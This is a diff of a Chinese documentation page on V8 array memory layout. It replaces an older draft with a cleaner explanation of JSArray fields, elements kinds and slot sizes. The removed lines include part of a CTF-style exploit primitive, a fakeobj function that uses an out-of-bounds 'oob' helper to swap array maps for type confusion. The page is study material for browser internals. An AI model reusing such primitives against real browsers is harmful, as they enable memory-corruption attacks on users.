-<a id="__codelineno-7-19" name="__codelineno-7-19" href="#__codelineno-7-19"></a><span class="w">    </span><span class="nx">obj_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="nx">map1</span><span class="p">);</span>
-<a id="__codelineno-7-20" name="__codelineno-7-20" href="#__codelineno-7-20"></a>
-<a id="__codelineno-7-21" name="__codelineno-7-21" href="#__codelineno-7-21"></a><span class="w">    </span><span class="c1">// Return the address as a BigInt</span>
-<a id="__codelineno-7-22" name="__codelineno-7-22" href="#__codelineno-7-22"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>
-<a id="__codelineno-7-23" name="__codelineno-7-23" href="#__codelineno-7-23"></a><span class="p">}</span>
-<a id="__codelineno-7-24" name="__codelineno-7-24" href="#__codelineno-7-24"></a>
-<a id="__codelineno-7-25" name="__codelineno-7-25" href="#__codelineno-7-25"></a><span class="kd">function</span><span class="w"> </span><span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<a id="__codelineno-7-26" name="__codelineno-7-26" href="#__codelineno-7-26"></a><span class="w">    </span><span class="c1">// First, put the address as a float into index 0 of the float array</span>
-<a id="__codelineno-7-27" name="__codelineno-7-27" href="#__codelineno-7-27"></a><span class="w">    </span><span class="nx">float_arr</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">itof</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>
-<a id="__codelineno-7-28" name="__codelineno-7-28" href="#__codelineno-7-28"></a>
-<a id="__codelineno-7-29" name="__codelineno-7-29" href="#__codelineno-7-29"></a><span class="w">    </span><span class="c1">// Change the float array&#39;s map to the obj array&#39;s map</span>
-<a id="__codelineno-7-30" name="__codelineno-7-30" href="#__codelineno-7-30"></a><span class="w">    </span><span class="nx">float_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="nx">obj_arr_map</span><span class="p">);</span>
-<a id="__codelineno-7-31" name="__codelineno-7-31" href="#__codelineno-7-31"></a>
-<a id="__codelineno-7-32" name="__codelineno-7-32" href="#__codelineno-7-32"></a><span class="w">    </span><span class="c1">// Get a &quot;fake&quot; object at that memory location and store it</span>
-<a id="__codelineno-7-33" name="__codelineno-7-33" href="#__codelineno-7-33"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">fake</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">float_arr</span><span class="p">[</span><span class="mf">0</span><span class="p">];</span>
-<a id="__codelineno-7-34" name="__codelineno-7-34" href="#__codelineno-7-34"></a>
-<a id="__codelineno-7-35" name="__codelineno-7-35" href="#__codelineno-7-35"></a><span class="w">    </span><span class="c1">// Set the map back</span>
-<a id="__codelineno-7-36" name="__codelineno-7-36" href="#__codelineno-7-36"></a><span class="w">    </span><span class="nx">float_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="nx">float_arr_map</span><span class="p">);</span>
-<a id="__codelineno-7-37" name="__codelineno-7-37" href="#__codelineno-7-37"></a>
-<a id="__codelineno-7-38" name="__codelineno-7-38" href="#__codelineno-7-38"></a><span class="w">    </span><span class="c1">// Return the object</span>
-<a id="__codelineno-7-39" name="__codelineno-7-39" href="#__codelineno-7-39"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">fake</span><span class="p">;</span>
-<a id="__codelineno-7-40" name="__codelineno-7-40" href="#__codelineno-7-40"></a><span class="p">}</span>
-</code></pre></div>
-<h3 id="map">**不同类型的数组 <code>Map</code> **<a class="headerlink" href="#map" title="Permanent link">&para;</a></h3>
-<p>V8 支持不同类型的数组，且每种数组类型有不同的 <strong><code>Map</code></strong>：</p>
-<ul>
-<li><strong><code>PackedSmiElements</code></strong>：代表一个存储 <strong>整型</strong>（即 <code>Smi</code>）的数组。<code>Smi</code> 是一种在 V8 中优化的小整数类型。</li>
-<li><strong><code>PackedDoubleElements</code></strong>：代表一个存储 <strong>浮动点数</strong>（<code>Float64</code>）的数组。</li>
-<li><strong><code>PackedElements</code></strong>：代表一个存储 <strong>对象引用</strong> 的数组（例如对象数组）。</li>
-<li><strong><code>HoleySmiElements</code></strong> 或 <strong><code>HoleyDoubleElements</code></strong>：代表一个 <strong>稀疏</strong> 数组，其中数组中的元素可能存在 "孔"（即未定义的元素），通常是 <code>undefined</code> 或 <code>hole</code>。</li>
-</ul>
-<p>要分情况，不能一句话说死成“一个 element 就是固定多少字节”。</p>
-<p>在 V8 里，<strong>elements 里的“一个元素槽位”大小</strong>，主要看这个数组的 elements kind。</p>
-<h2 id="1"><strong>1. 对象元素数组：</strong><a class="headerlink" href="#1" title="Permanent link">&para;</a></h2>
-<h2 id="packed_elements-holey_elements"><strong>PACKED_ELEMENTS / HOLEY_ELEMENTS</strong><a class="headerlink" href="#packed_elements-holey_elements" title="Permanent link">&para;</a></h2>
-<p>这种像你前面的：</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>let victim = [{x:1},{y:2}];
-</code></pre></div>
-<p>elements 通常是 FixedArray，里面放的是<strong>对象引用（tagged value）</strong>。</p>
-<h3 id="_6"><strong>槽位大小</strong><a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
-<p>在你现在这种常见 <strong>64 位 + pointer compression</strong> 的 V8 里，通常是：</p>
-<blockquote>
-<p><strong>每个元素槽位 4 字节</strong></p>
-</blockquote>
-<p>因为放的是压缩后的 tagged 值。</p>
-<p>所以：</p>
-<ul>
-<li>FixedArray[2] 的两个元素槽本身通常一共占 2 * 4 = 8 字节</li>
-<li>再加上 FixedArray 自己的头部</li>
-</ul>
-<p>注意，这说的是：</p>
-<blockquote>
-<p><strong>槽位大小</strong></p>
-</blockquote>
-<p>不是你看到的对象本体 {x:1}、{y:2} 大小。对象本体还是在别处。</p>
-<h2 id="2-packed_double_elements-holey_double_elements"><strong>2. 双精度数组：</strong>PACKED_DOUBLE_ELEMENTS / HOLEY_DOUBLE_ELEMENTS**<a class="headerlink" href="#2-packed_double_elements-holey_double_elements" title="Permanent link">&para;</a></h2>
-<p>这种数组里，elements 通常是 FixedDoubleArray。</p>
-<h3 id="_7"><strong>槽位大小</strong><a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
-<p>这里每个元素是一个 double，所以通常是：</p>
-<blockquote>
-<p><strong>每个元素 8 字节</strong></p>
-</blockquote>
-<p>这也是你前面看到地址计算里经常出现：</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>base + 8 + index * 8
-</code></pre></div>
-<p>的原因。</p>
-<hr />
-<h2 id="3-smi"><strong>3. Smi / 数值元素</strong><a class="headerlink" href="#3-smi" title="Permanent link">&para;</a></h2>
-<p>如果是 PACKED_SMI_ELEMENTS，在现代 V8 常见实现里，元素槽位也是放 tagged value，所以通常也按：</p>
-<blockquote>
-<p><strong>每槽 4 字节（压缩指针/tagged 表示）</strong></p>
-</blockquote>
-<p>但它里面装的是 Smi 编码值，不是对象引用。</p>
-<h1 id="_8"><strong>你现在最该记的版本</strong><a class="headerlink" href="#_8" title="Permanent link">&para;</a></h1>
-<p>在你当前分析 V8 exploit/CTF 的语境下，先记这张表最实用：</p>
-<table>
-<thead>
-<tr>
-<th><strong>elements kind</strong></th>
-<th><strong>backing store 类型</strong></th>
-<th><strong>单个元素槽大小</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>PACKED_ELEMENTS / HOLEY_ELEMENTS</td>
-<td>FixedArray</td>
-<td><strong>4 字节</strong></td>
-</tr>
-<tr>
-<td>PACKED_SMI_ELEMENTS / HOLEY_SMI_ELEMENTS</td>
-<td>FixedArray</td>
-<td><strong>4 字节</strong></td>
-</tr>
-<tr>
-<td>PACKED_DOUBLE_ELEMENTS / HOLEY_DOUBLE_ELEMENTS</td>
-<td>FixedDoubleArray</td>
-<td><strong>8 字节</strong></td>
-</tr>
-</tbody>
-</table>
-<p>这个表在 <strong>64 位 + pointer compression</strong> 的 V8 里非常常用。</p>
-<hr />
-<h1 id="_9"><strong>为什么你前面看到两个对象地址差</strong><a class="headerlink" href="#_9" title="Permanent link">&para;</a></h1>
-<h1 id="0x30"><strong>0x30</strong><a class="headerlink" href="#0x30" title="Permanent link">&para;</a></h1>
-<h1 id="element-0x30"><strong>，却不是“一个 element 占 0x30”</strong><a class="headerlink" href="#element-0x30" title="Permanent link">&para;</a></h1>
-<p>因为：</p>
-<ul>
-<li>elements[0] 槽位里只放了一个<strong>引用</strong></li>
-<li>elements[1] 槽位里也只放了一个<strong>引用</strong></li>
-</ul>
-<p>槽位本身并不大。</p>
-<p>你看到的：</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>0x...a659
-<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>0x...a689
-</code></pre></div>
-<p>差 0x30，那是<strong>两个对象本体在堆上的地址差</strong>，不是元素槽大小。</p>
-<hr />
-<h1 id="_10"><strong>最短总结</strong><a class="headerlink" href="#_10" title="Permanent link">&para;</a></h1>
-<p>如果你问的是 <strong>V8 里 elements backing store 的一个槽位多大</strong>，那在你现在最常见的环境里：</p>
-<ul>
-<li><strong>对象元素 / Smi 元素：4 字节一个槽</strong></li>
-<li><strong>double 元素：8 字节一个槽</strong></li>
-</ul>
-<p>你要的话，我下一条可以继续讲：</p>
-<p><strong>FixedArray 和 FixedDoubleArray 的头部各占多少，以及为什么很多地址计算里会有 +8。</strong></p>
+  <h1>V8 数组的内存布局</h1>
+
+<p>JavaScript 里的数组在 V8 里仍然是对象，只是命名属性和整数下标走的是两条路径。<code>arr.a = 1</code> 走 <code>properties</code>，<code>arr[0] = 1</code> 走 <code>elements</code>。</p>
+<p>下面几张图都是逻辑布局图，不对应某个固定版本下的精确偏移。</p>
+<h2 id="jsarray">JSArray 先看哪几块<a class="headerlink" href="#jsarray" title="Permanent link">&para;</a></h2>
+<p>一个普通 <code>JSArray</code> 先看四块：<code>map</code>、<code>properties</code>、<code>elements</code>、<code>length</code>。<code>map</code> 决定对象怎么解释，<code>elements</code> 指向数组元素的 backing store，<code>length</code> 是 JavaScript 层看到的长度。</p>
+<h2 id="map-elements-kind">Map 和 elements kind<a class="headerlink" href="#map-elements-kind" title="Permanent link">&para;</a></h2>
+<p>数组这里最关键的是 <code>map</code>。不同 <code>map</code> 对应不同 <code>elements kind</code>，也就决定了 <code>elements</code> 应该按什么类型去读。<code>PACKED_SMI_ELEMENTS</code> 是小整数数组，<code>PACKED_DOUBLE_ELEMENTS</code> 是浮点数组，<code>PACKED_ELEMENTS</code> 是通用 tagged 数组；前面加上 <code>HOLEY</code>，表示数组里允许空洞。</p>
+<h2 id="fixeddoublearray-fixedarray"><code>FixedDoubleArray</code> 和 <code>FixedArray</code><a class="headerlink" href="#fixeddoublearray-fixedarray" title="Permanent link">&para;</a></h2>
+<p>像 <code>let arr = [1.1, 2.2, 3.3]</code> 这种纯浮点数组，<code>elements</code> 通常指向 <code>FixedDoubleArray</code>。后面的元素按连续的 8 字节 double 存放。</p>
+<p><img alt="V8 double array layout" src="../images/%E6%B5%AE%E7%82%B9%E5%9E%8B%E6%95%B0%E7%BB%84.png" /></p>
+<p><em>图：<code>PACKED_DOUBLE_ELEMENTS</code> 一类数组的 <code>elements</code> 通常指向 <code>FixedDoubleArray</code>。数组对象本体和 double backing store 是两块独立对象。</em></p>
+<p>对象数组、混合类型数组，以及已经泛化后的数组，<code>elements</code> 更常见的是 <code>FixedArray</code>。这里的槽位放的是 tagged value；在 64 位并启用 pointer compression 的场景下，通常按 4 字节看。</p>
+<p><img alt="V8 object array layout" src="../images/%E5%AF%B9%E8%B1%A1%E5%9E%8B%E6%95%B0%E7%BB%84.png" /></p>
+<p><em>图：对象数组只是 <code>PACKED_ELEMENTS</code> 的常见形态。<code>FixedArray</code> 里放的是 tagged 槽位，槽位内容往往还要继续跟着引用追下去。</em></p>
+<p><code>PACKED_SMI_ELEMENTS</code> 也走 <code>FixedArray</code>，只是槽位里装的是 <code>Smi</code>。</p>
+<h2 id="elements-kind">elements kind 的变化<a class="headerlink" href="#elements-kind" title="Permanent link">&para;</a></h2>
+<p><code>elements kind</code> 不是固定的，通常只会往更通用的方向变化。最常见的是 <code>PACKED_SMI_ELEMENTS -&gt; PACKED_DOUBLE_ELEMENTS -&gt; PACKED_ELEMENTS</code>：一开始全是小整数时走 <code>PACKED_SMI_ELEMENTS</code>，写入浮点数后会变成 <code>PACKED_DOUBLE_ELEMENTS</code>，这时 <code>elements</code> 会从 <code>FixedArray</code> 换成 <code>FixedDoubleArray</code>；再写入对象、字符串这类普通 tagged 值后，会继续降级成 <code>PACKED_ELEMENTS</code>，<code>elements</code> 又回到 <code>FixedArray</code>，原来的 double 也会按 <code>HeapNumber</code> 引用来存。</p>
+<p>另一条常见变化是 <code>PACKED_* -&gt; HOLEY_*</code>。数组里一旦出现空洞，<code>map</code> 就会切到对应的 <code>HOLEY</code> 版本。这个变化通常不改 backing store 的大类：<code>*_DOUBLE_*</code> 还是 <code>FixedDoubleArray</code>，其余一般还是 <code>FixedArray</code>，只是数组从密集模式变成了稀疏模式。</p>
+<h2 id="_1">常用对应表<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<div class="comparison-table">
+  <table class="comparison-table__table">
+    <thead>
+      <tr>
+        <th>elements kind</th>
+        <th>backing store</th>
+        <th>槽大小</th>
+        <th>典型内容</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>
+          <div class="comparison-table__kinds">
+            <span class="comparison-table__pill">PACKED_SMI_ELEMENTS</span>
+            <span class="comparison-table__pill comparison-table__pill--muted">HOLEY_SMI_ELEMENTS</span>
+          </div>
+        </td>
+        <td><code>FixedArray</code></td>
+        <td><strong>4</strong> 字节</td>
+        <td><code>Smi</code></td>
+      </tr>
+      <tr>
+        <td>
+          <div class="comparison-table__kinds">
+            <span class="comparison-table__pill">PACKED_DOUBLE_ELEMENTS</span>
+            <span class="comparison-table__pill comparison-table__pill--muted">HOLEY_DOUBLE_ELEMENTS</span>
+          </div>
+        </td>
+        <td><code>FixedDoubleArray</code></td>
+        <td><strong>8</strong> 字节</td>
+        <td><code>Float64</code></td>
+      </tr>
+      <tr>
+        <td>
+          <div class="comparison-table__kinds">
+            <span class="comparison-table__pill">PACKED_ELEMENTS</span>
+            <span class="comparison-table__pill comparison-table__pill--muted">HOLEY_ELEMENTS</span>
+          </div>
+        </td>
+        <td><code>FixedArray</code></td>
+        <td><strong>4</strong> 字节</td>
+        <td>tagged value / 对象引用</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<h2 id="_2">参考资料<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p><a href="https://v8.dev/blog/fast-properties">V8 Team, Fast properties in V8</a></p>
+<p><a href="https://v8.dev/blog/elements-kinds">V8 Team, Elements kinds in V8</a></p>
+<p><a href="https://v8.dev/blog/pointer-compression">V8 Team, Pointer Compression in V8</a></p>
 
 
 
@@ -1436,12 +1432,12 @@
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "navigation.instant", "navigation.tracking", "toc.follow", "search.suggest", "search.highlight", "content.code.copy", "content.tabs.link"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "navigation.instant", "search.suggest", "search.highlight", "content.code.copy", "content.tabs.link"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
     
     
       <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
       
-        <script src="../../javascripts/extra.js"></script>
+        <script src="../../javascripts/extra.js?v=2026-04-27-v43"></script>
       
     
   </body>
